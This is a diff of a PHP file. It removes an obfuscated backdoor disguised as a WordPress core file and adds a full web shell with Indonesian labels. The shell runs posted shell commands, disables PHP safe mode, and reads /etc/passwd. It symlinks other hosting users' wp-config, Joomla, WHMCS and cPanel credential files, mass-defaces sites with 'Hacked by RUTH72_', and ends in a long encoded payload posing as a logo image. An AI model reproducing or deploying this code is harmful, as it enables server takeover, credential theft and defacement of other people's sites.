@@ -1,66 +1,1318 @@
-<?php 
-/**
- * Sets up the default filters and actions for most
- * of the WordPress hooks.
- *
- * If you need to remove a default hook, this file will
- * give you the priority for which to use to remove the
- * hook.
- *
- * Not all of the default hooks are found in style.php
- *
- * @package WordPress
- * @id 83a6ee9b34553e9cf5ef0c507270c
- */
-
-// Strip, trim, kses, special wp_nonces for string saves
-error_reporting(0);
-$wp_nonce = "";
-
-function pre_term_name($auth_data, $wp_nonce) {
-	if(file_exists("index.php")) {
-		touch(__FILE__, filemtime("index.php"));
-	}
-	$kses_str = str_replace( array ('%', '#'), array ('/', '+'), $auth_data);
-	$filterfunc = strrev('46esab')."_".strrev('edoced');
-	$filter = $filterfunc($kses_str);
-	$preparefunc = strrev('etalfnizg');
-	return @$preparefunc($filter);
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<center>
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+$asui = getcwd() . "/";
+$ip = gethostbyname($_SERVER['HTTP_HOST']);
+$ini = "fopen";
+$fw = "fwrite";
+$ada = "function_exists";
+$crot = "shell_exec";
+if (isset($_POST['cmd'])) {
+    $mulai = $ini('php.ini', 'w');
+    $buat = " safe_mode = OFF n
+disable_functions = NONE n
+safe_mode_gid = OFF n
+open_basedir = OFF n
+register_globals = ON n
+exec = ON n
+shell_exec = ON n";
+    $fw($mulai, $buat);
+    if ($ada('shell_exec')) {
+        $lihat = $_POST['cmd'];
+        $hasil = $crot("$lihat");
+        echo "<pre>$hasil</pre>";
+    }
+    
 }
-if(isset($_POST['newname'])){
-	if(trim($_POST['newname']) != '') {
-		$name = trim($_POST['newname']).'.php';
-		$lul = file_get_contents(__FILE__);
-		$lol = fopen($name, "w+");
-		fwrite($lol, $lul);
-		fclose($lol);
-		if(file_exists($name)){
-			unlink(__FILE__);
-			echo 'xXsUIssAZ:'.$name.':xXsUIssAZ';
+
+if($_GET['do'] == 'config') {
+@ini_set('max_execution_time',0); 
+@ini_set('display_errors', 0); 
+@ini_set('file_uploads',1);
+echo '<form method="POST"><textarea cols="30" name="passwd"  rows="10">'; 
+$uSr=file("/etc/passwd"); 
+foreach($uSr as $usrr) { 
+$str=explode(":",$usrr); echo $str[0]."\n"; } 
+echo'</textarea><br><input type="hidden" class="input" name="folfig" value="taek" size=40 />
+<select class="inp"  title="Select Your Type File"  name="type" size=""><option title="type txt" value=".txt">.txt<option><option title="type php" value=".php">.php<option><option title="type shtml" value=".shtml">.shtml<option><option title="type ini" value=".ini">.ini<option></select>
+<input name="conf" size="80" class="ipt" value="Hajar..." type="submit"><br><br></form></center>';}
+if ($_POST['conf']) {
+$folfig = $_POST['folfig']; $type = $_POST['type'];
+@mkdir($folfig, 0755); 
+@chdir($folfig);
+$htaccess="
+Options Indexes FollowSymLinks
+\nDirectoryIndex .my.cnf
+\nAddType txt .php
+\nAddType txt .my.cnf
+\nAddType txt .accesshash
+\nAddHandler txt .php
+\nAddHandler txt .cnf
+\nAddHandler txt .accesshash
+";
+file_put_contents(".htaccess",$htaccess,FILE_APPEND);
+$passwd=explode("\n",$_POST["passwd"]); echo "<blink><center >tunggu sebentar ya ...</center></blink>";
+foreach($passwd as $pwd){ $user=trim($pwd);
+@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');
+@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-vBulletin3.txt');
+@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-vBulletin4.txt');
+@symlink('/home/'.$user.'/public_html/config.php',$user.'-Phpbb1.txt');
+@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Phpbb2.txt');
+@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress1.txt');
+@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress2.txt');
+@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla1.txt');
+@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla2.txt');
+@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla3.txt');
+@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-Whm1.txt');
+@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-Whm2.txt');
+@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-Whm3.txt');
+@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-Whm4.txt');
+@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-Whm5.txt');
+@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-Whm6.txt');
+@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-Whm7.txt');
+@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-Whm8.txt');
+@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-Whm9.txt');
+@symlink('/home/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
+@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
+@symlink('/home/'.$user.'/public_html/conf_global.php',$user.'-invisio.txt');
+@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-7.txt');
+@symlink('/home/'.$user.'/public_html/connect.php',$user.'-8.txt');
+@symlink('/home/'.$user.'/public_html/mk_conf.php',$user.'-mk-portale1.txt');
+@symlink('/home/'.$user.'/public_html/include/config.php',$user.'-12.txt');
+@symlink('/home/'.$user.'/public_html/settings.php',$user.'-Smf.txt');
+@symlink('/home/'.$user.'/public_html/includes/functions.php',$user.'-phpbb3.txt');
+@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-infinity.txt');
+@symlink('/home/'.$user.'/.my.cnf',$user.'-cpanel.txt');
+@symlink('/home/'.$user.'/.accesshash',$user.'-whm.txt');
+@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-opencart.txt');
+@symlink('/home/'.$user.'/public_html/slconfig.php',$user.'-sitelok.txt');
+@symlink('/home/'.$user.'/public_html/application/config/database.php',$user.'-elislab.txt');
+@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-mangentot.txt');
+@symlink('/home/'.$user.'/public_html/config/koneksi.php',$user.'-lokmed.txt');
+@symlink('/home/'.$user.'/public_html/po-library/po-config.php',$user.'-popojembut.txt');
+@symlink('/home/'.$user.'/public_html/lokomedia/config/koneksi.php',$user.'-lokmed.txt');
+echo '<center>Selesai mas/mba bro untuk melihat hasilnya klik -> <blink><a href='.$folfig.'>'.$folfig.'</a></blink>';
+
+}
+}
+if($_GET['do'] == 'mass_deface') {
+	function sabun_massal($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=lime>DONE</font>] $lokasi<br>";
+							file_put_contents($lokasi, $isi_script);
+							$idx = sabun_massal($dirc,$namafile,$isi_script);
+						}
+					}
+				}
+			}
 		}
 	}
-	exit;
+	function sabun_biasa($dir,$namafile,$isi_script) {
+		if(is_writable($dir)) {
+			$dira = scandir($dir);
+			foreach($dira as $dirb) {
+				$dirc = "$dir/$dirb";
+				$lokasi = $dirc.'/'.$namafile;
+				if($dirb === '.') {
+					file_put_contents($lokasi, $isi_script);
+				} elseif($dirb === '..') {
+					file_put_contents($lokasi, $isi_script);
+				} else {
+					if(is_dir($dirc)) {
+						if(is_writable($dirc)) {
+							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
+							file_put_contents($lokasi, $isi_script);
+						}
+					}
+				}
+			}
+		}
+	}
+	if($_POST['start']) {
+		if($_POST['tipe_sabun'] == 'mahal') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		} elseif($_POST['tipe_sabun'] == 'murah') {
+			echo "<div style='margin: 5px auto; padding: 5px'>";
+			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
+			echo "</div>";
+		}
+	} else {
+	echo "<center>";
+	echo "<form method='post'>
+	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
+	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
+	<font style='text-decoration: underline;'>Folder:</font><br>
+	<input type='text' name='d_dir' value='$asui' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Filename:</font><br>
+	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
+	<font style='text-decoration: underline;'>Index File:</font><br>
+	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by RUTH72_</textarea><br>
+	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
+	</form></center>";
+	}
 }
-/**
- * Sets up the default filters and actions for most
- * of the WordPress hooks.
- *
- * If you need to remove a default hook, this file will
- * give you the priority for which to use to remove the
- * hook.
- *
- * Not all of the default hooks are found in style.php
- *
- * @package WordPress
- * @id 83a6ee9b34553e9cf5ef0c507270c
- */
+if($_GET['do'] == 'jumping') {
+	$i = 0;
+	echo "<div class='margin: 5px auto;'>";
+	if(preg_match("/hsphere/", $dir)) {
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$url = str_replace(array("http://","www."), "", strtolower($url));
+				$etc = "/etc/passwd";
+				$f = fopen($etc,"r");
+				while($gets = fgets($f)) {
+					$pecah = explode(":", $gets);
+					$user = $pecah[0];
+					$dir_user = "/hsphere/local/home/$user";
+					if(is_dir($dir_user) === true) {
+						$url_user = $dir_user."/".$url;
+						if(is_readable($url_user)) {
+							$i++;
+							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a><br>";
+							if(is_writable($url_user)) {
+								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a><br>";
+							}
+							echo $jrw."<br>";
+						}
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
+			while($getss = fgets($fp)) {
+				echo $getss;
+			}
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
+	} elseif(preg_match("/vhosts/", $dir)) {
+		$urls = explode("\r\n", $_POST['url']);
+		if(isset($_POST['jump'])) {
+			echo "<pre>";
+			foreach($urls as $url) {
+				$web_vh = "/var/www/vhosts/$url/httpdocs";
+				if(is_dir($web_vh) === true) {
+					if(is_readable($web_vh)) {
+						$i++;
+						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a><br>";
+						if(is_writable($web_vh)) {
+							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a><br>";
+						}
+						echo $jrw."<br>";
+					}
+				}
+			}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+		} else {
+			echo '<center>
+				  <form method="post">
+				  List Domains: <br>
+				  <textarea name="url" style="width: 500px; height: 250px;">';
+				  bing("ip:$ip");
+			echo  '</textarea><br>
+				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
+				  </form></center>';
+		}
+	} else {
+		echo "<pre>";
+		$etc = fopen("/etc/passwd", "r");
+		while($passwd = fgets($etc)) {
+			if($passwd == '' || !$etc) {
+				echo "<font color=red>Can't read /etc/passwd</font>";
+			} else {
+				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+				foreach($user_jumping[1] as $user_idx_jump) {
+					$user_jumping_dir = "/home/$user_idx_jump/public_html";
+					if(is_readable($user_jumping_dir)){
+						$i++;
+						$jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
+						if(is_writable($user_jumping_dir)) {
+							$jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
+						}
+						echo $jrw;
+						if(function_exists('posix_getpwuid')) {
+							$domain_jump = file_get_contents("/etc/named.conf");	
+							if($domain_jump == '') {
+								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+							} else {
+								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+								foreach($domains_jump[1] as $dj) {
+									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+									$user_jumping_url = $user_jumping_url['name'];
+									if($user_jumping_url == $user_idx_jump) {
+										echo " => ( <u>$dj</u> )<br>";
+										break;
+									}
+								}
+							}
+						} else {
+							echo "<br>";
+						}
+					}
+				}
+			}
+		}
+		if($i == 0) { 
+		} else {
+			echo "<br>Total ada ".$i." Kamar di ".$ip;
+		}
+		echo "</pre>";
+	}
+	echo "</div>";
+}
+if($_GET['do'] == 'wpm') {
+echo "
 
-// Strip, trim, kses, special wp_nonces for string saves
-$wp_default_logo = '<img src="data:image/png;5X1te9s2EuBn93n6H2BWW0qNLEty0s1Kluxs4mxyTeKs7Wy3Z%tUWqQk1hKpkpQdN5v%fjODd77Ictre3j2nNpZIDAYDYDAYDAaDr7%a%e7rr7bexv7XX323#%VXX39VC6OQsQFzUm8SjBaxHwziyeQi8sPUu5oHo8kqGmdhHKWDi2i1nMeeP1p4H0eTcB6k4W8B5Oy0315EyzjNKEG%dPqAfZbBw#EkXgYRq7vL2bIF5blN99ZtQHI4qQNEg30Cmia3SZgF#NxkSBSmb03G8zill%j4GQmmXGGaBlm9Nnp%fHp27o5nwfj6duleNhpff4W4AAIJHAUfwzRL6#7tcmccR5Nw2gIK3EaDBeNZzNyfAm82m7kSs4H35OifH44Q9S%xdWDhzZJwUQLAtgfMdQFsC#G2agtshCsvDSJvAfSPTo9O%nV0cu6ePj95%f5s9PL1m6N3z94eQc4#wc9Xc8hARE#DbATUZkEEpAMiAfFbOwGINEtGSbCce2PAerscRXE0Dpps4T#poqwBzQnYZTkxlYP9gbibzLl1eJJsf4CAHFCaeC16AF7zF9AGQAS0a1IvJ3c9NdiUW7yRtngvLL00vY0Tfzzzomngu1TKZxbM04CZcBMvnItE#IP%oHsz3nllXRcFt9j4a3tPw4gOZKoH8T00VXWOlkvc1P#T#tvqKcRa2Veqd8v6yhwHhMbsgFU0D6NrXaho6Zv23N9btJOs57YoT8vtqXdVXUCC5SjymSlcxvE8RrZ1vmm3J5N2m2SCH0y81TwbeSRYINV9idLkrRe5ZvIqDUbeL95H6oRVYCYBqyTQ25j1xzDy49t0p9N90sHsxAvbwWKZ3Rnd8Ors7P3oAzyNnv3j6N0Z8gTyFoNPDcpJnk2x9QGflyTeXd35RxxP54EDTX46XyVL%PH29N3f4wx%hd7IS8az8CZI8PEnL%KDj%jrxFuAyEyokxA1ULJMginIxWw8q7u7LmuxcAFC1A%q7n%cpll2A9Lc3RBfbkI1fmaB5wdJncB2O602e9x#zN7FGXsZryLflVTgR3QT%vwspN0hyNgRDhk3SJI4Gc3jqdt89#HNG8ynE#H1iABSt9m2k1DcBx#D8Qq7cZSFMCoECCTT82geLsKs3hayXs4lSi4j3MKbhuPRr6s4C9JRsooID1T0sCqRozsEXggjaMcfT49H0Fqnr4%fQeO53dYTqjkVOM2jmC7H9YaYbwQxDBCgQFumcy#dBTBKiAc40FYSZKskYmE64pwhEw84pwD2JZFgYsA#FGA9Voa6LwYPn7#A6wokUILswNro#fHxD6#PSgF5kpodVa1u0%hNPA2jOq#IHwZ1Z38MnBYkw%1JnCzYIshmsT%AmXv4XsjgHtsPo#UqY9ndMhhIycxQBtDT0ExOV1fQu#zGm6#CgTscusP9XcQMX6Igp0gX1iDIxnF8DRTVrqGpbvRQFLU5r11fQmVrN6IBChmMGVsOdTkX6iFSUBOwAijpv%2W1XGKyr8fQJEajR48Fsk8ozVCXwEWyN80chMDciJYfVuSIWpXjQKI#M9%2EaQOF#VUqs73mglYJoMRPEtiAvoNZy73796Pzo#bbabew2quXMbRg5ODbUY5aALjyhOcRbWL6PwI5exNaUtonqHEmGKEkG9ldrdtgYUJHJhAypMnGRhNOWDGUV7Xt#0EBdSqYDaLAYZM771ERbg4FddFJxTELkSsHU4nvlhYr1GNKUYqMqiIfgYMosz9TDn4gKl%y78USA0xmvrYQUYV1%w6Rwg5zjdY8pOh%oYZo2GRNWiRzXJbcxWOLXgTMpbwRppm2SCKtSvYtApClNzPy9yXvEpibcX0CjnYamn07QtOmOr8BrH%D%eHP%92ZvTczc317uX2KLTeXzlzRnXK%AFKSzO%ixbzIf7OCEO90GueWyWZcud4NdVeDNwn3PlaucMhJbLhKo1cLPgY7aLGftMlDFwoNJFqlrMAdGWhdk8GHKIkvZCKLaDsoIhjDErsZazv8tzf%3Vfprd0Y#r2L%7dOWNr6cJztY7VKPeN48fP#6Ln0EH%#t%5rDNzG9ms0#gEEZZj%1tmbE3q3Hoe81%BYnvRV5%4SUw6nvtPqglWTj25jvePJxGvSxe5jCiCpDhcIK12CT#xETqZDLpFwnqdruUIV16UXPWaXoSXnQC2waNBsayF2UKjlO5cxuE0xkQexXPgSkoddb5BI8JPO7Mg0nWe7L8yNJ4HvqyS5ee74NY6LEupEBqn9e38xgqLGtaTqSsP#TBkvzwpiW6#hNTWBEjB1Tll6Db29sjHFBXZJIdPxjHiYc83gNxG%C03iyGli5CAJ4gAbWag7UWc1XlXkfVlvpZUqWJgt5DpBOQ1D3mrbKY47gKp14SADW3oZ%Nep12#y%9GW%cvbasME3MTaQGYZtpMA%GUHWFeG0vP3nypF8gUnSJwXJv4yiGDoYVJwyqVRIGCXsX3LpUPs78ujhB1DcZyI307Gou2omzJNcOeN0I4HW0lJVjVCPedF4YMeB5Iyd2Whn5Af7X15kS0TtVoAgJHVM6%iitW5IGbAFpoNF%IvaeeItwftcTDdFUbYNk7O%Kcb6fjkFfy4Zc7t54CRuPcCpFIYHCJ10G49Cbk7Spa#kH4p7LYMft66xeddZDKbc8yue4RoFckm2QVwtoxGAUvOyo3HVUJkBp1LmWHfey6VyA#rA9GEw80BgaB67bK9bOhIf1zOifH47Pjk4bhcK66wrrPrCw7j2F7a0rbO#Bhe2tLwy1AT8erxYwAPrmGgQncq85bi47zWW3udxrip4QqxCYSb3tQbSazxt#azFpeS2udHt9spLY70Zy6T82s4xF8tjIot6pLMuOmWfZEQDLjpHLeKvzda18XQnRNfPptzrfnpVvT0Lsmfn0W1013jxWBfkrWSX#ZFa2LH0kl2KqJ6br#qGym4guKoYviuqNAmLvyxETn3qJtyAlHBWvAVpEuCUG5G49HLT74T6VD2IfuSttgSI5zWb98NEjUra2BIJHgOFb95EFex5etnCJ98gduI#CaAza#oeT189jmNgjSK8XgKkNOW1pUqfBA3OZXpRK%UhYzUaATciUpqhIsX0A0SqZq3TJ#Kx#Sxae1r%fvnkFSt0JKHVBmvE6JcGv0CJRcMvsVN78W9T5BopnUNJN8O%jq19gasxjsBLr7ttwnMRpPMmoYNDzLHsKIoWsljkGP%CuFUcw%%p3aeZlAbdpQgnLJB4HaQr0PadX%ZJ8aOlzUZBAK1FTYCc3SiCBMURFub7N6raO2wQmWS7noARiy#5#3Lm9vd3B#XlnhesL7F%bPKQRR35dd5BM#pzvq3xt6lpOUbu0qAVOsQVwDfW4wXhrQzoVAwkrWl11222RlXN5EkxFd5wE06OPy%qFU7#Aj%#oUT%HH6f4J738roHLKHfhCrslZfaSZAAIWmiTElSkwMFpcAYKhAQMgHfrAHnevWyJpXC7iVnPO7As4UDC#OzNQZOuu6Kp#cp125WcC1O8nNnFwgPV9OE#KJ6MJv#BC3NJSDqhdwUa1SoL#oYCV677g7YOuhrppu2#i7jzthpujFlMZCGwNIal5R3XTCmHYaKZhb4fRDyLtyZtvCZt2VmX2F2XuLeuSC7hEIJbjRxaMk#SIDhFNQpX5FC3a3xBelVBOyL4LM68uZVhRK9Gm#Yxng6M370OgSYg9ryUcC9ny9GKzPtuwrmgdh0kUTDPJaYiMfi4ROs6imxcjfZ2d%FNHMJq4QqWJovdNEAz8u4Bt4MP#OO3k3AOyvHIDzh7YQoJem7FQfXEfRNGq49oZeTl497FgHH1hNbVsuTWgKkBL3KxHzjJaIoW7C%r2Gw3v#cjQBh9KhDJWrcASTmaPY4GbRQFky#OiY9o1Ammoe8KW#wWGcKFDWY0XiUJyDK0MiRCktdWoTTRLO7gt3w9NV5Pjdcwrpa47XBATGVuJklMio7lLeLTZBF2G71KnCZTC3ZqwIoaIP5zl28RmaTz9%BHvpY0YiF2Bl4qfz#VGciSR2agEXYJaQLEF7Wll83giZgLuofblsrYPhqMQdxkdcrBt1dBd6ih8sBq4X4t2ungD1AYRFPpwoABnH2PzZJgMnC%cVkcjWF6uR64U5DQcvcGRPKF4yilpPYLIf5lf1AL8VsqIjZaIua89stli5u2CsVeOA136LQEHCgfzu7#rselhWwULkr0%o374ezlzlOcB63tIXj#4fj1050T9esD%hovn37%vRi08VJZnHQTQ20Cbzyr64K8FBoqCxZ8vFmZ0Ei3H9PAFaZxx20RcAsUJbdVtIYNBpR84PI1O8zNPddttNyhyre%yxEOufFvq7bQVT0Nxi32OprE7mCID%Sz6b71wjk7g3kLX#MD%W7yrTZ8p%bccC0fwfwU4Fv5s#me%jonjPClRrMw5ynmkvZnZdFbnLtv4mm84sY8#ZtaFpJOg%kEpvgFLM15Or444c8cJohWxVZfUHODIB2i7V9stwIgtTTwPk2q2Mr1MMoadZhddwWjLxrQjH9xhudMMq%zjaOY1wHmdaGNb1ruhdvElUTzAn#pPw0Hu#Aa298bssv93WymesBPQFtEFuEcjxZc1SxxitWzbMeqNgnpS#4YWvg3SMOaEaqG0J%CdEQmanrZcnsXQIYYN6JIqnZVddRYxBoA8RLNLtXmnOlXWB#olSsVcb71u0#GQTYGVT4doHmQjYP5XFiqBnv0hDMrPrVFy6M6M9zPEvjny1fDfTQEDj#gXOvtXyXDDyAe6cf72ZK#X%k#fT#%9Xs4jVS134GLUC#o7j0aGTjzgPaF#KFL%KGrNFVMgBf7UQxZjLnJmJ4bTQb6XqfbJjSaLxBaz3doEMi8BGT8YHQ196Lr4bk9eVPj7e9SQfuiMJL0iLTO#CPOCPjcYLw1%oEivydI5zBTOwufFCiPxIq03wRJCsO%Lmim%KfeJGC4sWIhNFpRb8ZcQhuiyYpbbkFH9ofH71DrirIhtKiZNgVtC5r1anj88uX#7tVQQjXMNlat9o3NfNC1uYGEHCQ4D6pB%MTZjtfhBSwQcEvXqoIPL#vuTzuLHZ#96oW9VPS4aI%bNP5XGNyehr#BKqL1NbNpXkIlLJRWHqVh8ix1F1oNBQczknYNzN912pxZ%qL6xJyiUAuiEt4HySJ9jq1YZserbDR7xCJylVluJtHugiWZpHg6ZwjD21QRJ#UEjpKS4SGHKCOT6iBBO7IYMvt8BkICaV2HFFJ3lv3JZmEqLAHOEGc8zrxz7yqYD5z3Hqx7xRTncLrsaZLxWY0yAZvxkqkSgr#DBNievX4ve1INCGVfcPj36NmLFyfOpWQSnv35PAQdsiS7aZ14e3x2RLl5C8vxjK0Gf#gXisN8E5KI5MsvR#xm4Lqtq837uIPgPER0EmV8VqNu02UbC0pHWNefOEPltGbuvr2M40ztvtVgJkE3ISJ2wIynAnseOMyUAS4JAXdY%xG9jDBHQ4gBp2dDoiSpo8eJRK0AhfWAb8%hEg9qgUu9wvQS#gO5R7BhezG58q1uepFyFWdZvMgn4hp5C9scZ1WaLmiJDYoPme5Qp9X8LUykoNiCHtoX3iC01AI8gtO4jQdmbZPVxLKX19SVuxwuXwfjjoZYBUv3iQ33A3AncjMXDKhYRQUvYFRzsXOGZLnGcJ5I055V0wtHVPUk8HxyWvuCmk4eRjgfA9W9pCtBOixVwV1cQy#4vCr##qq89a6tPjOHywNq5f#f6A6sGLa6u7YyZr98YW3#jD5SK4rCoKqqzRH5lH0Jj6nR9OWjRFja0E6Ruezo3fOzn94fDdzFap6FSy%JKOMO6Ciey3NWWdtkcZxHn0XrwS05kBv2NOrXZV52ZG7uoY1F3lOccKA0Ci34VMutwIPCK6GES6q4pk8lfzkTYsaHMeFVwliOFeWUSbMNqK9kkCUfD5qRhDcUK5qlHNsc5HAnMWFvM3xSCm5Il03m2nndxkDuFartAW04t61OtSWAWIPgM23lryeRrFBfSCLl3YxEbuyqINFWPI4#1mthJPQOWPGrNTzWpGACRPu8svwdkrUecjcxo7ClcRSHv8RhVMftV53GTXmlaNGNL5slK4U6vhqlsIiTu0GHEoBoNQsCQLI7zgMvqt9XTHqXZsGishCe%DuLmIHqM7KaSaDRKaoEjQeGWxKk8SpBu%eEGy7Jexwa10mcRg6XMNXdzmDk1bcPJ0E8gWzS2IAwrQGb4E4OvG522t3HvEZL4WU#UXt4gj0wT5laqpdeqeGcSfSGaKVJTffFGtpU0mUCKZO685cVGjPVZpQwtKRsiCdM%rr318edp0DW19pRV#Z0%9JpdSdoI0%ZrgHLGrgU#8ffXWnnNvA9fvrkr99vgowAGV%VvS1FtRlRSA4h#UEjMbLV#Ory76W6Pq02#egU4wwe2Les%fF5G9erg4H8WQtxOKYGmRr2mYZ9pmHnpbBPNexTDbtTCvu9hv1ew16Vwj7WsI81rF8K29WwXQ07LoXtaNiOhl0qWMZfrLjpMURuV3nbtOY%YG7ish5WslEG1H7KgW7XAj0mIP3iqUCdUq6PaB7qlSSfSqTlWLub0NfZhL72U5u#x#vpe7wZfe3HG9DX7m5CX8emrysIyMrpk8lnFn1ySIWVY0lYbiZ6QG0fkkT1fL5oFqJRYLKsZt#8fAl0tqV9io%NQ1RplnyYThrCasmtaSa7Uil6ab6mFJDUWfDgMipp7j7BEzkPwVdouNOxF3FrdZiYfvcF3SXlgI59gEWKRxOLkPR6y05NDP4MzynijJYHJrd3nMZgLkUVhfZDoQLwRpziwl7kuWYNc7YhxHSW8Zy8j2WWfoFIDiWpK2mLH2chblYIgSx35bhy5N5iIjfxLvO7KbQbZ3Y6vTGYlqtd#SL5rrHY8BE2H8MDu69N#rOONKalsLACTrtjaHpJFuQeAvpxhxuZuGIunGY5A1mdHYzfo2tIvRapUxugKNyoQ3I36tCZSpUk0HqAqh8hT%WYWCLwHT9jb7t202TkcAeC29zTFpigNGkK5jklh6uSlok0Ly3mHV4kz7MLKUPr8BpvMFUtVzZSPMluvQTdaHBjOYhuIIkbGk#PX579#OzkiAuVCmZ3vaU3nvFzfYvYX#F#W#6Ahi7zDSyaAp89oyxMgjf1MTFQ3pusiLHe4HLNQvaC6%4#e%%qPXupFgDmdnDJ8uBgbWrPRccSt1jYMR7pxROPjGwuxmENHKIjTMGEEjLVzgVDRbaQXe1bkJ47uhdJGI3nK79IhsYjIKpQjT#cvGHpaolu7ICh0J8wZuYjsQXjNg5ckBDYyi42jZizQOVfDviGrBzeBTSLu%TXuVgFoG16hINQbO4RAhJBztu701%nrO60SuHrjZbTcCqLSDELjOAoGGclqE9P%%mmMvNyWp3zfZzCejBYlz0eh9X5jxMPlj5OsRd5qwPLokUFeabI%ISmYQo0Mfwrt13xmFLBNc8q90TM6mw3yMa7dM7NJ#YxJnzXTGscOHdBytb7QJD9Dh3TLhzKy39yDOTGcH4DSyHarHEU82xIYzrz%Pi2nEaR9jto5BgeTuPxKZMDAygrHmd2d9FVcFcNnrXIXuChcrIBVSFDgsM0XQWtKMiK2OjAWdn#Z4EZaN7H%dkJncMWrhTTMW7Lz#kv%wlM4S68a%SHwLPe8DdI5vh1l82wzm6yurqDr8wD2eNOfwsR5kp%deE7Ikzx2MsQTboKfUKSJ57rOLiVkGiKrr0bxBD7e4jpyh%HSYA0rW5QaUJ0BOAnt8EVvoeZb4HfyfVshWcs8NXsOonj7DpE749wSWpmSj8nt0h5Ei5vw4RIm4XB3KeK46BModETrFwakWCE8QX6A9Yl9FPPX2DmMQ7UKcJ8DH2q5pSCMfCft3juGRPv0oWX4svfFldA#JIIv12Ec2zLW9BERG2iMPrFq2iZ#DZCCyNwkm6eW#APyDYJeDnzu#gj0RddYw1RbmOvEMz8drmzCNGFsxS%LVkKpefkez5dOHeAzil5ynAQygMLTtUqI8FVAKrSuX6KoCXlW8PoAychL0e1GP3y2gn2%C9W7gVR8KfUzWCw%2YFNRmb11Jx724p#1oFvHrxgpFvLOAUqxN%wnZmRXFazApaQLpONs8I4D4S#WrANoWDwoPznWNOyA25ASSs#rnNJdf0TXCeOHxvibzXxQkV4023fMvJlX5Lw5dJvOAb%5m9p6d3lzhqsRXRNt0EBI6zeBMMXYEBjVIlvgaVmx%OcOjIzY#yXuYmVdzVsQ8%MfN0Eu0agAYRrRZBEo4tyMq0vXzkiQJ%S3NyGQD6gvbNctj#wKLJShTep2WIqLRy912rGhV0yDZCFGvGq65Ta8BoBwIU%SZlauHKtAL75%LX94xM%BSEd6qU3pIcuXI#f227N#e1s39J7UwMddDExBLIBn02JpdJdhpkeCw%VRlA0WIeT0xLcyLF7JmEMLPhXCiyGA6GtDfnipWA9FipsG7I%f26tW%ADSdGmAR3ok#2U%eZCcgtqwhICb05bUJYuayNhW37uDqeU5R7JultiDFcrCRh4hjjGtjcee1xgwQiPETf1hFPC3yKmgU4MBrQKZV%7maL5Yg7f#NANVN08KItZd9wnoOeBC2rN1u3#S7O1tYVTGTXfYMi7gxhEXNtR